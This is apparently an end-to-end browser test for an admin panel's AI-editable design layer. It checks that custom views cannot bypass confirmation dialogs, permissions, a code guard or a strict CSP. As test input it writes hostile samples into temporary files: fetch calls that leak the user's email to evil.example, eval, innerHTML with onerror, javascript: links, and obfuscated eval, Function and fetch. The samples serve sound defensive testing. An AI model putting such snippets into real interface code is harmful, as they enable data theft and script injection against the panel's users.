// Browser E2E for the design layer of the platform admin (admin/design/), adapted from merchant-template/admin/e2e/design.mjs:
// what the AI-editable layer CAN change and what it CANNOT.
//
//   DP1  a design view that calls the core actions directly still gets the core confirmation dialog with the FIXED warning
//        (declining or hostile options change nothing); copy.js cannot weaken the warning
//   DP2  a design view run as a user without permission still gets a permission error (staff on the demo shop, editor on a
//        content shop): no request leaves, no dialog opens, a route without permission never mounts its view
//   DP3  a THROWING / broken design view falls back to the built-in view; so do a throwing shell and login screen
//   DP4  hostile design code is caught by the guard (scripts/check-design.mjs), and the runtime refuses what it can
//        (the safe builder h() drops dangerous attributes, ctx is frozen)
//   DP5  the strict production CSP (the one scripts/serve.mjs --csp sends) is respected: zero violations while the main and the
//        content screens load, a login works against the API; and hostile code (eval, fetch) is blocked by the CSP itself
//
// The test REWRITES FILES IN admin/design/ temporarily. A full copy of that folder is kept in a temp dir and put back in a
// finally block; at the end the folder's file hashes and `git status --short admin/design` are compared with the start.
//
// Runs standalone (`node design-path.mjs`: API on E2E_API_BASE_URL, admin dev server on E2E_ADMIN_BASE_URL) or is imported by
// happy-path.mjs (runDesignPath(browser, {admin})), sharing lib.mjs's failure counter. Throwaway stack only.
import { spawn, spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { cpSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { chromium } from "playwright";
import { WARNINGS } from "../admin/lib/meta/index.js";
import { API, brief, check, fail, failureCount, runID, section } from "./lib.mjs";
import { answerConfirm, newAdminPage, provisionContentShop, req, uiLogin, uiSchema } from "./content-ui-path.mjs";

const ADMIN_DIR = fileURLToPath(new URL("../admin/", import.meta.url));
const DESIGN = join(ADMIN_DIR, "design");
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const ADMIN_BASE = () => (process.env.E2E_ADMIN_BASE_URL ?? "http://localhost:3001").replace(/\/+$/, "");
const STAFF = { email: "demo-staff@example.com", password: "demo-staff-change-me" };
const T = (page, id) => page.locator(`[data-testid="${id}"]`);

// ── temporary design files ──────────────────────────────────────────────
const treeHash = (dir) => {
  const h = createHash("sha256");
  const walk = (d, rel) => {
    for (const name of readdirSync(d).sort()) {
      const p = join(d, name);
      if (statSync(p).isDirectory()) walk(p, `${rel}${name}/`);
      else h.update(`${rel}${name}\0`).update(readFileSync(p)).update("\0");
    }
  };
  walk(dir, "");
  return h.digest("hex");
};
const gitStatus = () => spawnSync("git", ["status", "--short", "admin/design"], { cwd: join(ADMIN_DIR, ".."), encoding: "utf8" }).stdout;
const put = (rel, text) => { const f = join(DESIGN, rel); mkdirSync(dirname(f), { recursive: true }); writeFileSync(f, text); };
const read = (rel) => readFileSync(join(DESIGN, rel), "utf8");
const route = (id, file) => put("routes.js", read("routes.js").replace(new RegExp(`("${id}": )"[^"]+"`), `$1"${file}"`));
const guard = (...files) => {
  const r = spawnSync(process.execPath, [join(ADMIN_DIR, "scripts/check-design.mjs"), "--json", "--files", ...files], { cwd: ADMIN_DIR, encoding: "utf8" });
  let violations = [];
  try { violations = JSON.parse(r.stdout).violations; } catch { /* not JSON: leave empty, the check fails below */ }
  // The core manifest is allowed to be missing in this checkout (a human creates it); every other violation counts.
  return { status: r.status, violations: violations.filter((v) => v.rule !== "manifest/missing"), raw: r.stdout + r.stderr };
};

// The permission battery: every content / publishing data function and action, each with harmless arguments.
// It never opens a confirmation (restore is left to the callers that want it).
export const BATTERY = `
const KEY = ctx.route.params[0] || "home";
const calls = {
  contentDocuments: () => ctx.data.contentDocuments(),
  contentDocument: () => ctx.data.contentDocument(KEY),
  contentTypes: () => ctx.data.contentTypes(),
  contentSchemaStatus: () => ctx.data.contentSchemaStatus(),
  dryRunContentSchema: () => ctx.data.dryRunContentSchema("{}"),
  contentSchedulesUpcoming: () => ctx.data.contentSchedulesUpcoming({}),
  contentDocumentSchedule: () => ctx.data.contentDocumentSchedule(KEY),
  publishHookStatus: () => ctx.data.publishHookStatus(),
  saveContentDocument: () => ctx.actions.saveContentDocument(KEY, { x: 1 }, { rev: 1 }),
  createContentDocument: () => ctx.actions.createContentDocument({ key: "dp-new", typeKey: "home" }),
  publishContentDocument: () => ctx.actions.publishContentDocument(KEY, { confirmed: true, skipConfirm: true }),
  unpublishContentDocument: () => ctx.actions.unpublishContentDocument(KEY),
  deleteContentDocument: () => ctx.actions.deleteContentDocument(KEY),
  registerContentSchema: () => ctx.actions.registerContentSchema("{}"),
  createContentPreviewToken: () => ctx.actions.createContentPreviewToken(KEY, {}),
  contentSchedulePublish: () => ctx.actions.contentSchedulePublish({ key: "home", localDateTime: "2099-01-01T10:00", draftRev: 1 }),
  contentScheduleCancel: () => ctx.actions.contentScheduleCancel(KEY),
  publishHookSave: () => ctx.actions.publishHookSave({ url: "x" }),
  publishHookSetEnabled: () => ctx.actions.publishHookSetEnabled(true),
  publishHookRotateSecret: () => ctx.actions.publishHookRotateSecret(),
  publishHookDelete: () => ctx.actions.publishHookDelete(),
  publishHookFire: () => ctx.actions.publishHookFire(),
  publishHookTest: () => ctx.actions.publishHookTest(),
};
const out = {};
for (const [name, fn] of Object.entries(calls)) {
  try { await fn(); out[name] = "ok"; } catch (e) { out[name] = e && e.isActionError ? e.kind : "other:" + (e && (e.status || e.message)); }
}
root.append(ctx.ui.h("pre", { "data-testid": "probe-perm", "data-route": ctx.route.id }, JSON.stringify(out)));
`;

export async function runDesignPath(browser, { admin = ADMIN_BASE() } = {}) {
  section("㉘ Design layer: confirmations and permissions cannot be skipped, broken designs fall back, hostile code is caught, strict CSP holds");
  const backup = mkdtempSync(join(tmpdir(), "design-backup-"));
  cpSync(DESIGN, join(backup, "design"), { recursive: true });
  const hashBefore = treeHash(DESIGN);
  const gitBefore = gitStatus();
  const restore = () => {
    rmSync(DESIGN, { recursive: true, force: true });
    cpSync(join(backup, "design"), DESIGN, { recursive: true });
  };
  let cspServer = null;
  let cspBrowser = null;
  const pages = [];
  try {
    // ── a content shop: schema registered, three documents ────────────────
    const S = await provisionContentShop("design");
    const { sp, owner, pk } = S;
    const reg = await req("PUT", sp("/content/schema"), { token: owner, body: uiSchema });
    if (reg.status !== 200) throw new Error(`schema registration failed: ${brief(reg)}`);
    const mk = async (key, headline) => {
      const r = await req("PUT", sp(`/content/documents/${key}`), { token: owner, headers: { "If-None-Match": "*" }, body: { type_key: "landing", content: { headline } } });
      if (![200, 201].includes(r.status)) throw new Error(`document ${key}: ${brief(r)}`);
    };
    const kA = `campaign-dp-a-${runID}`; // stays a draft: publish target
    const kB = `campaign-dp-b-${runID}`; // published + one revision: unpublish / restore / delete targets
    const kC = `campaign-dp-c-${runID}`; // gets a pending schedule: cancel target
    await mk(kA, "A"); await mk(kB, "B"); await mk(kC, "C");
    const pubB = await req("POST", sp(`/content/documents/${kB}/publish`), { token: owner });
    const docStatus = async (k) => (await req("GET", sp(`/content/documents/${k}`), { token: owner })).json;
    const curC = await docStatus(kC);
    const schedC = await req("PUT", sp(`/content/documents/${kC}/schedule`), {
      token: owner, headers: { "If-Match": `"${curC.draft_rev}"` }, body: { publish_at: new Date(Date.now() + 40 * 60000).toISOString() },
    });
    check("(setup) a draft, a published document with a revision, and a document with a pending schedule", pubB.status === 200 && schedC.status === 201, `${pubB.status} ${schedC.status}`);

    const page = await newAdminPage(browser, admin);
    pages.push(page);
    // This section rewrites admin/design/* between reloads. The static server sends only Last-Modified, so Chromium may serve a
    // module it already fetched from its heuristic cache and never see the rewrite (copy.js, routes.js): keep the cache off.
    await page.route("**/design/**", (route) => route.continue()); // an active route makes Playwright disable the HTTP cache for the page
    const warnings = [];
    const requests = [];
    page.on("console", (m) => { if (m.type() === "warning") warnings.push(m.text()); });
    page.on("request", (r) => requests.push({ method: r.method(), url: r.url() }));
    const gotoHash = (h) => page.evaluate((x) => { location.hash = x; }, h);
    const reload = async (hash, sel) => {
      warnings.length = 0;
      await page.evaluate((x) => { location.hash = x; }, hash);
      await page.reload();
      await page.waitForSelector(sel, { timeout: 15000 });
    };

    // ── DP1: calling the core actions directly still asks the core ────────
    put("views/probe-docs.js", `export default async function probe(root, ctx) {
  const { h } = ctx.ui;
  const key = ctx.route.params[0] || "";
  const bad = { confirmed: true, skipConfirm: true, force: true, ask: () => true };
  const calls = {
    publish: () => ctx.actions.publishContentDocument(key, bad),
    unpublish: () => ctx.actions.unpublishContentDocument(key, bad),
    delete: () => ctx.actions.deleteContentDocument(key, bad),
    restore: () => ctx.actions.restoreContentRevision(key, 1, bad),
    register: () => ctx.actions.registerContentSchema(${JSON.stringify(JSON.stringify({ ...uiSchema, documents: {} }))}),
    scheduleCancel: () => ctx.actions.contentScheduleCancel(key, bad),
    hookDelete: () => ctx.actions.publishHookDelete(bad),
  };
  const out = h("pre", { "data-testid": "probe-out" });
  root.append(h("div", { "data-testid": "probe" }, Object.entries(calls).map(([name, fn]) => h("button", { "data-testid": "p-" + name, onclick: async () => {
    try { const r = await fn(); out.textContent = name + ":" + (r && r.cancelled ? "cancelled" : "done"); } catch (e) { out.textContent = name + ":ERR:" + (e && e.isActionError ? e.kind : "other"); }
  } }, name))), out);
}
`);
    route("documents", "views/probe-docs.js");
    const g1 = guard("design/routes.js", "design/views/probe-docs.js");
    check("guard: a view that only uses ctx is accepted", g1.violations.length === 0, JSON.stringify(g1.violations));
    await uiLogin(page, admin, S.ownerEmail, S.ownerPassword);
    const probe = async (name, accept) => {
      await page.evaluate(() => { document.querySelector('[data-testid="probe-out"]').textContent = ""; });
      await T(page, `p-${name}`).click();
      const d = await answerConfirm(page, accept);
      await page.waitForFunction((n) => (document.querySelector('[data-testid="probe-out"]')?.textContent || "").startsWith(n + ":"), name, { timeout: 8000 });
      return { dialog: d, out: await T(page, "probe-out").innerText() };
    };
    await reload(`#/documents/${kA}`, '[data-testid="probe"]');
    check("the custom view replaced the built-in documents screen", (await page.locator("#tab-document").count()) === 0);
    let r = await probe("publish", false);
    check("publish called from a design view: the core confirmation appears with the FIXED warning", r.dialog.warning === WARNINGS.publishContent, JSON.stringify(r.dialog));
    check("declining it returns 'cancelled' and the document is NOT published (extra options like confirmed/skipConfirm change nothing)",
      r.out === "publish:cancelled" && (await docStatus(kA)).status === 0 && (await req("GET", `/api/v1/shop/content/${kA}`, { pk })).status === 404, r.out);
    r = await probe("publish", true);
    check("accepting it publishes through the core (the human decided)", r.out === "publish:done" && (await docStatus(kA)).status === 1);
    await reload(`#/documents/${kB}`, '[data-testid="probe"]');
    r = await probe("unpublish", false);
    check("unpublish from a design view: fixed warning, declined -> still published", r.dialog.warning === WARNINGS.unpublishContent && (await docStatus(kB)).status === 1, JSON.stringify(r.dialog));
    r = await probe("delete", false);
    check("delete from a design view: fixed warning, declined -> document still exists", r.dialog.warning === WARNINGS.deleteContent && (await docStatus(kB)).key === kB, JSON.stringify(r.dialog));
    r = await probe("restore", false);
    check("restore from a design view: fixed warning, declined -> draft unchanged", r.dialog.warning === WARNINGS.restoreContent, JSON.stringify(r.dialog));
    r = await probe("register", false);
    check("registering a schema from a design view: the core confirmation with the FIXED warning (the dry run came first), declined -> version unchanged",
      r.dialog.warning === WARNINGS.registerContentSchema && (await req("GET", sp("/content/schema"), { token: owner })).json?.version === 1, JSON.stringify(r.dialog));
    check("... and its detail carries the removal report the human is asked to read", /documents|banner|campaign|removed|移除|不在/i.test(r.dialog.detail ?? "") || (r.dialog.detail ?? "").length > 0);
    await reload(`#/documents/${kC}`, '[data-testid="probe"]');
    r = await probe("scheduleCancel", false);
    check("cancelling a schedule from a design view: fixed warning, declined -> still pending", r.dialog.warning === WARNINGS.cancelSchedule && (await req("GET", sp(`/content/documents/${kC}/schedule`), { token: owner })).json?.status === "pending", JSON.stringify(r.dialog));
    r = await probe("hookDelete", false);
    check("deleting the hook from a design view: fixed warning", r.dialog.warning === WARNINGS.deletePublishHook, JSON.stringify(r.dialog));
    restore();

    // copy.js cannot define or weaken the warning
    const hostileCopy = read("copy.js").replace('"confirm.publishContent.text": ""',
      '"confirm.publishContent.text": "放心，這個動作隨時可以復原。", "confirm.publishContent.warning": "沒有任何風險", "confirm.publishContent.message": "沒有任何風險"');
    check("(setup) the hostile copy edit applied", hostileCopy !== read("copy.js"));
    put("copy.js", hostileCopy);
    const g2 = guard("design/copy.js");
    check("guard: copy that defines a confirmation warning is rejected, naming the fixed warning", g2.status === 1 && g2.violations.some((v) => /^schema\/copy/.test(v.rule) && /cannot be defined/.test(v.msg)), g2.raw.slice(0, 400));
    put("views/probe-docs.js", `export default async function probe(root, ctx) {
  const { h } = ctx.ui;
  root.append(h("button", { "data-testid": "p-publish", onclick: async () => { try { await ctx.actions.publishContentDocument(ctx.route.params[0]); } catch {} } }, "publish"));
}
`);
    route("documents", "views/probe-docs.js");
    const kD = `campaign-dp-d-${runID}`;
    await mk(kD, "D");
    await reload(`#/documents/${kD}`, '[data-testid="p-publish"]');
    await T(page, "p-publish").click();
    const hd = await answerConfirm(page, false);
    check("even with such a copy.js deployed, the dialog still shows the unchanged fixed warning", hd.warning === WARNINGS.publishContent, JSON.stringify(hd));
    check("the invented warning text never appears", !/沒有任何風險/.test(`${hd.title} ${hd.text} ${hd.warning}`), JSON.stringify(hd));
    check("the editable lead-in may be reworded, and sits next to the warning", hd.text.includes("放心，這個動作隨時可以復原。"), JSON.stringify(hd));
    check("the loader reported the rejected keys on the console", warnings.some((w) => /cannot be defined/.test(w)), warnings.join(" | ").slice(0, 300));
    check("declined: the document is still a draft", (await docStatus(kD)).status === 0);
    restore();

    // ── DP2: a design view cannot get past permissions ────────────────────
    const staffPage = await newAdminPage(browser, admin);
    pages.push(staffPage);
    const staffReqs = [];
    staffPage.on("request", (rq) => staffReqs.push({ method: rq.method(), url: rq.url() }));
    put("views/probe-perm.js", `export default async function probe(root, ctx) {\n${BATTERY}}\n`);
    route("orders", "views/probe-perm.js");
    route("documents", "views/probe-perm.js");
    route("contentSchema", "views/probe-perm.js");
    route("contentPublishing", "views/probe-perm.js");
    check("guard: the permission probe uses only ctx", guard("design/routes.js", "design/views/probe-perm.js").violations.length === 0);
    await uiLogin(staffPage, admin, STAFF.email, STAFF.password);
    await staffPage.waitForSelector('[data-testid="probe-perm"]', { timeout: 20000 });
    const staffOut = JSON.parse(await T(staffPage, "probe-perm").innerText());
    const names = Object.keys(staffOut);
    check(`staff (order.view only) + a hostile orders view: all ${names.length} content/publishing data functions and actions are refused with the permission error`,
      names.length >= 20 && names.every((n) => staffOut[n] === "permission"), JSON.stringify(staffOut));
    await sleep(500);
    check("none of those attempts reached the API (no request to /content) and no dialog opened",
      !staffReqs.some((q) => /\/api\/v1\/admin\/shops\/\d+\/content|publish-hook/.test(q.url)) && (await staffPage.locator("dialog[open]").count()) === 0,
      staffReqs.filter((q) => /\/api\/v1\//.test(q.url)).map((q) => q.method + " " + q.url.split("/api/v1")[1]).join(" ").slice(0, 400));
    for (const h of ["#/documents", "#/content-schema", "#/content-publishing"]) {
      await staffPage.evaluate((x) => { location.hash = x; }, h);
      await sleep(600);
      const where = await staffPage.evaluate(() => location.hash);
      const rt = await staffPage.locator('[data-testid="probe-perm"]').last().getAttribute("data-route");
      check(`staff: ${h} falls back to an allowed screen and the custom view is never mounted for it`, where !== h && rt === "orders", `${where} ${rt}`);
    }
    await staffPage.context().close();

    // the editor of the content shop: view + edit, nothing else
    put("views/probe-perm.js", `export default async function probe(root, ctx) {\n${BATTERY}}\n`);
    const edPage = await newAdminPage(browser, admin);
    pages.push(edPage);
    const edReqs = [];
    edPage.on("request", (rq) => edReqs.push({ method: rq.method(), url: rq.url() }));
    await uiLogin(edPage, admin, S.editorEmail, S.editorPassword);
    await edPage.evaluate((k) => { location.hash = `#/documents/${k}`; }, kB);
    await edPage.waitForSelector('[data-testid="probe-perm"][data-route="documents"]', { timeout: 20000 });
    const edOut = JSON.parse(await T(edPage, "probe-perm").innerText());
    const mustDeny = ["publishContentDocument", "unpublishContentDocument", "deleteContentDocument", "registerContentSchema", "contentSchemaStatus", "dryRunContentSchema",
      "contentSchedulesUpcoming", "contentSchedulePublish", "contentScheduleCancel", "publishHookStatus", "publishHookSave", "publishHookSetEnabled", "publishHookRotateSecret", "publishHookDelete", "publishHookFire", "publishHookTest"];
    check("editor + a hostile view: publish, delete, schema, schedule and hook calls are refused with the permission error", mustDeny.every((n) => edOut[n] === "permission"), JSON.stringify(edOut));
    check("editor: what content.view allows still works (list, read, schedule read, preview token)",
      ["contentDocuments", "contentDocument", "contentTypes", "contentDocumentSchedule", "createContentPreviewToken"].every((n) => edOut[n] === "ok"), JSON.stringify(edOut));
    check("editor: no write request other than the preview token left the page, and no dialog opened",
      !edReqs.some((q) => q.method !== "GET" && q.method !== "OPTIONS" && /\/api\/v1\/admin\/shops\/\d+\/content/.test(q.url) && !/preview-token/.test(q.url)) && (await edPage.locator("dialog[open]").count()) === 0);
    await edPage.context().close();
    restore();

    // ── DP3: broken designs fall back ─────────────────────────────────────
    put("views/boom.js", `export default async function boom(root, ctx) { root.append("PARTIAL-OUTPUT"); throw new Error("boom"); }\n`);
    put("views/syntax.js", `export default function ( {{{ this is not javascript\n`);
    route("documents", "views/boom.js");
    route("contentSchema", "views/syntax.js");
    route("contentPublishing", "views/does-not-exist.js");
    await reload("#/documents", "#tab-documents");
    check("a documents view that throws: the built-in documents screen is shown instead of the partial output", !(await page.locator("main, body").first().innerText()).includes("PARTIAL-OUTPUT"));
    check("... with a console warning", warnings.some((w) => /design view "documents" failed/.test(w)), warnings.join(" | ").slice(0, 300));
    await gotoHash("#/content-schema");
    await page.waitForSelector("#tab-content-schema");
    check("a view with a syntax error: the built-in content-schema screen is shown, with a warning", warnings.some((w) => /contentSchema/.test(w) && /could not be loaded/.test(w)), warnings.join(" | ").slice(0, 300));
    await gotoHash("#/content-publishing");
    await page.waitForSelector("#tab-content-publishing");
    check("a view whose file does not exist: the built-in publishing screen is shown", warnings.some((w) => /contentPublishing/.test(w)));
    await gotoHash(`#/documents/${kB}`);
    await page.waitForSelector(`#tab-document [data-testid="cf:/headline"]`, { timeout: 10000 });
    check("the built-in editor still works through the fallback (core actions are intact)", (await T(page, "cf:/headline").inputValue()) === "B");
    restore();

    // a throwing shell and login screen (fresh, logged-out context)
    put("views/bad-shell.js", `export default function shell() { throw new Error("shell boom"); }\n`);
    route("shell", "views/bad-shell.js");
    route("login", "views/bad-shell.js");
    const p3 = await newAdminPage(browser, admin);
    pages.push(p3);
    const w3 = [];
    p3.on("console", (m) => { if (m.type() === "warning") w3.push(m.text()); });
    await p3.goto(`${admin}/`);
    await p3.waitForSelector("#login-email", { timeout: 10000 });
    check("a throwing login view falls back to the built-in login (login is never blocked)", w3.some((w) => /design view "login" failed/.test(w)), w3.join(" | ").slice(0, 300));
    await uiLogin(p3, admin, S.ownerEmail, S.ownerPassword);
    check("a throwing shell falls back to the built-in shell: the owner is logged in and the tabs are there",
      (await p3.locator("#tabs [data-tab]").count()) > 3 && w3.some((w) => /design view "shell" failed/.test(w)), w3.join(" | ").slice(0, 300));
    await p3.context().close();
    restore();
    put("routes.js", "export default { documents: ((( \n");
    put("copy.js", "export default { 'oops': \n");
    const p3b = await newAdminPage(browser, admin);
    pages.push(p3b);
    const w3b = [];
    p3b.on("console", (m) => { if (m.type() === "warning") w3b.push(m.text()); });
    await uiLogin(p3b, admin, S.editorEmail, S.editorPassword); // the owner login limiter allows 5 per 5 minutes: spare it
    await p3b.evaluate(() => { location.hash = "#/documents"; });
    await p3b.waitForSelector("#tab-documents", { timeout: 10000 });
    check("a syntactically invalid routes.js AND copy.js: defaults everywhere, login and the documents screen work (editor)",
      w3b.some((w) => /routes\.js could not be loaded/.test(w)) && w3b.some((w) => /copy\.js could not be loaded/.test(w)), w3b.join(" | ").slice(0, 300));
    await p3b.context().close();
    restore();

    // ── DP4: hostile code ─────────────────────────────────────────────────
    const hostile = {
      "views/evil-fetch.js": [`export default function evil(root, ctx) { fetch("https://evil.example/?e=" + ctx.session.userEmail); }\n`, /"fetch" is not allowed/],
      "views/evil-storage.js": [`export default function evil(root, ctx) { localStorage.setItem("k", ctx.session.userEmail); }\n`, /"localStorage" is not allowed/],
      "views/evil-eval.js": [`export default function evil(root, ctx) { eval("1+1"); }\n`, /"eval" is not allowed/],
      "views/evil-html.js": [`export default function evil(root, ctx) { root.innerHTML = "<img src=x onerror=1>"; }\n`, /"innerHTML" is not allowed/],
      "views/evil-import.js": [`import { api } from "../../lib/api.js";\nexport default function evil(root, ctx) { api("GET", "/admin/me"); }\n`, /leaves design\//],
      "views/evil-core.js": [`import { session } from "../../core/guard.js";\nexport default function evil() { session; }\n`, /leaves design\//],
    };
    for (const [file, [src, re]] of Object.entries(hostile)) {
      put(file, src);
      const g = guard("design/routes.js", `design/${file}`);
      check(`guard: ${file.replace("views/", "")} is rejected (exit 1)`, g.status === 1 && g.violations.some((v) => v.file === `design/${file}` && re.test(v.msg)), g.raw.slice(0, 300));
    }
    put("theme.css", "@import url(https://evil.example/x.css);\n");
    const gc = guard("design/routes.js", "design/theme.css");
    check("guard: a remote CSS @import is rejected", gc.status === 1 && gc.violations.some((v) => /^css\//.test(v.rule)), gc.raw.slice(0, 300));
    const gs = guard("design/routes.js", "lib/api.js");
    check("guard: a diff that touches the core (lib/api.js) is rejected", gs.status === 1 && gs.violations.some((v) => v.rule === "scope/outside-design"));
    restore();
    const gOk = guard();
    check("guard: after restoring the defaults everything passes (the missing core manifest aside)", gOk.violations.length === 0, JSON.stringify(gOk.violations));

    // what a view that ignored the guard could still do at runtime
    put("views/evil-runtime.js", `export default async function evil(root, ctx) {
  const { h } = ctx.ui;
  const out = {};
  root.append(
    h("div", { "data-testid": "ev-html", innerHTML: "<img src=x onerror=window.__pwn=1>" }),
    h("img", { "data-testid": "ev-img", src: "https://evil.example/x.png" }),
    h("a", { "data-testid": "ev-link", href: "javascript:window.__pwn=2" }, "link"),
    h("button", { "data-testid": "ev-btn", onclick: "window.__pwn=3" }, "btn"),
    h("form", { "data-testid": "ev-form", action: "https://evil.example/post" }),
    h("script", { "data-testid": "ev-script" }, "window.__pwn=4"),
    h("iframe", { "data-testid": "ev-iframe", src: "https://evil.example/" }),
    h("div", { "data-testid": "ev-style", style: "background:url(https://evil.example/x)" }),
  );
  out.frozen = Object.isFrozen(ctx) && Object.isFrozen(ctx.actions) && Object.isFrozen(ctx.data) && Object.isFrozen(ctx.ui);
  try { ctx.data.contentDocuments = () => []; out.patched = "yes"; } catch { out.patched = "no"; }
  try { ctx.actions.publishContentDocument = () => ({ ok: true }); out.patchedAction = ctx.actions.publishContentDocument.length === 2 ? "no" : "yes"; } catch { out.patchedAction = "no"; }
  out.keys = Object.keys(ctx).join(",");
  root.append(h("pre", { "data-testid": "ev-out" }, JSON.stringify(out)));
}
`);
    route("documents", "views/evil-runtime.js");
    await reload("#/documents", '[data-testid="ev-out"]');
    const ev = JSON.parse(await T(page, "ev-out").innerText());
    check("runtime: the builder dropped innerHTML, the foreign image source, the javascript: link, the string handler and the form action",
      (await T(page, "ev-html").getAttribute("innerhtml")) === null && (await T(page, "ev-html").innerHTML()) === "" && (await T(page, "ev-img").getAttribute("src")) === null &&
        (await T(page, "ev-link").getAttribute("href")) === null && (await T(page, "ev-btn").getAttribute("onclick")) === null && (await T(page, "ev-form").getAttribute("action")) === null);
    check("runtime: <script> and <iframe> were not created, and a string style was refused",
      (await T(page, "ev-script").count()) === 0 && (await T(page, "ev-iframe").count()) === 0 && (await T(page, "ev-style").getAttribute("style")) === null);
    await T(page, "ev-btn").click();
    check("runtime: nothing executed (no window.__pwn)", (await page.evaluate(() => window.__pwn)) === undefined);
    check("runtime: the builder warned about what it refused", warnings.filter((w) => /\[design\] ui: refused/.test(w)).length >= 5, warnings.join(" | ").slice(0, 300));
    check("runtime: ctx is deeply frozen, cannot be patched and carries no token, password or shop credential",
      ev.frozen === true && ev.patched === "no" && ev.patchedAction === "no" && !/token|password|secret/i.test(ev.keys), JSON.stringify(ev));
    restore();

    // ── DP5: the strict CSP ───────────────────────────────────────────────
    const cspPort = Number(process.env.E2E_CSP_PORT ?? 3002);
    const apiOrigin = new URL(API).origin;
    cspServer = spawn(process.execPath, ["scripts/serve.mjs", "--csp"], {
      cwd: ADMIN_DIR, stdio: "ignore",
      env: { ...process.env, PORT: String(cspPort), HOST: "127.0.0.1", CSP_CONNECT_EXTRA: `${apiOrigin} http://127.0.0.1:9000` },
    });
    let policy = "";
    for (let i = 0; i < 40 && !policy; i++) {
      await sleep(250);
      policy = (await fetch(`http://127.0.0.1:${cspPort}/`).then((r) => r.headers.get("content-security-policy") ?? "", () => ""));
    }
    check("scripts/serve.mjs --csp sends the production policy (script-src 'self', no unsafe-inline/unsafe-eval, frame-ancestors none)",
      /script-src 'self'/.test(policy) && !/(?<!wasm-)unsafe-(inline|eval)/.test(policy) && /frame-ancestors 'none'/.test(policy) && policy.includes(apiOrigin), policy);
    // The API's CORS allows the admin origin of the dev server only, so the page is served by that server and the policy of the
    // CSP server is applied to the document through a route: the browser enforces exactly the header serve.mjs sends.
    // Chromium treats documents fulfilled by a Playwright route as non-local and would block the loopback API (Local Network
    // Access), so this one page gets its own browser with those checks off; the CSP itself is untouched.
    cspBrowser = await chromium.launch({ args: ["--disable-features=LocalNetworkAccessChecks,PrivateNetworkAccessSendPreflights,PrivateNetworkAccessRespectPreflightResults,BlockInsecurePrivateNetworkRequests,LocalNetworkAccessPermissionPolicy"] });
    const cspPage = await newAdminPage(cspBrowser, admin);
    pages.push(cspPage);
    const violations = [];
    await cspPage.addInitScript(() => {
      document.addEventListener("securitypolicyviolation", (e) => console.log(`CSPV ${e.violatedDirective} ${e.blockedURI}`));
    });
    cspPage.on("console", (m) => { if (/^CSPV|Content Security Policy|Refused to/i.test(m.text())) violations.push(m.text().slice(0, 200)); });
    await cspPage.route(`${admin}/`, async (rt) => {
      const resp = await rt.fetch();
      await rt.fulfill({ response: resp, headers: { ...resp.headers(), "content-security-policy": policy } });
    });
    await uiLogin(cspPage, admin, S.ownerEmail, S.ownerPassword);
    const screens = [
      ["#/pages", "#tab-pages"], ["#/orders", "#tab-orders"], ["#/products", "#tab-products"], ["#/team", "#tab-team"],
      ["#/documents", "#documents-table:not([hidden])"], [`#/documents/${kB}`, `[data-testid="cf:/headline"]`], [`#/documents/${kB}/revisions`, "#revisions-tbody tr[data-rev]"],
      ["#/content-schema", '#schema-active[data-version="1"]'], ["#/content-publishing", "#publishing-hook-state"],
    ];
    for (const [h, sel] of screens) {
      await cspPage.evaluate((x) => { location.hash = x; }, h);
      await cspPage.waitForSelector(sel, { timeout: 10000 });
    }
    // exercise the editor (save), the dialogs and the dry run under the policy too
    await cspPage.evaluate((k) => { location.hash = `#/documents/${k}`; }, kB);
    await cspPage.waitForSelector(`[data-testid="cf:/headline"]`);
    await T(cspPage, "cf:/headline").fill("CSP edit");
    await cspPage.click("#document-save");
    await cspPage.waitForFunction(() => document.querySelector("#document-status").textContent.includes("草稿已儲存"), null, { timeout: 8000 });
    await cspPage.click("#document-publish");
    await answerConfirm(cspPage, false);
    await cspPage.evaluate(() => { location.hash = "#/content-schema"; });
    await cspPage.waitForSelector("#schema-text");
    await cspPage.fill("#schema-text", JSON.stringify(uiSchema));
    await cspPage.click("#schema-dryrun");
    await cspPage.waitForSelector("#schema-dryrun-summary", { timeout: 8000 });
    check("under the strict CSP: a login works against the API and the main and content screens load, save, confirm and dry-run", (await cspPage.locator("#whoami").innerText()).includes(S.ownerEmail));
    check("under the strict CSP: zero policy violations were reported", violations.length === 0, violations.join(" | "));
    // the CSP is a backstop for code that slips past the guard
    put("views/evil-csp.js", `export default function evil(root, ctx) {
  const out = ctx.ui.h("pre", { "data-testid": "csp-out" });
  const res = [];
  try { (0, globalThis["ev" + "al"])("1+1"); res.push("eval ran"); } catch (e) { res.push("eval blocked"); }
  try { new (globalThis["Fun" + "ction"])("return 1")(); res.push("Function ran"); } catch (e) { res.push("Function blocked"); }
  Promise.resolve().then(() => globalThis["fe" + "tch"]("https://evil.example/leak")).then(() => res.push("fetch sent"), () => res.push("fetch blocked")).then(() => { out.textContent = res.join(","); });
  root.append(out);
}
`);
    route("documents", "views/evil-csp.js");
    violations.length = 0;
    await cspPage.evaluate(() => { location.hash = "#/documents"; });
    await cspPage.reload();
    await cspPage.waitForSelector('[data-testid="csp-out"]', { timeout: 15000 });
    await cspPage.waitForFunction(() => (document.querySelector('[data-testid="csp-out"]')?.textContent || "").includes("fetch"), null, { timeout: 8000 });
    const cspOut = await T(cspPage, "csp-out").innerText();
    check("CSP backstop: eval, new Function and a request to a foreign host are all blocked at runtime", cspOut === "eval blocked,Function blocked,fetch blocked" || /eval blocked.*Function blocked.*fetch blocked/.test(cspOut), cspOut);
    check("CSP backstop: the browser reported the violations", violations.length >= 3, violations.join(" | "));
    restore();
  } catch (e) {
    fail(`design path aborted: ${e?.stack ?? e}`);
  } finally {
    restore_final: {
      try {
        rmSync(DESIGN, { recursive: true, force: true });
        cpSync(join(backup, "design"), DESIGN, { recursive: true });
      } catch (e) {
        fail(`design files could NOT be restored: ${e?.message ?? e} (backup kept at ${backup})`);
        break restore_final;
      }
      rmSync(backup, { recursive: true, force: true });
    }
    if (cspServer) cspServer.kill();
    if (cspBrowser) await cspBrowser.close().catch(() => {});
    for (const p of pages) await p.context().close().catch(() => {});
  }
  check("design files are back to exactly what they were (tree hash)", existsSync(DESIGN) && treeHash(DESIGN) === hashBefore);
  check("`git status --short admin/design` is unchanged by the run (no temporary view or edit left behind)", gitStatus() === gitBefore, gitStatus());
}

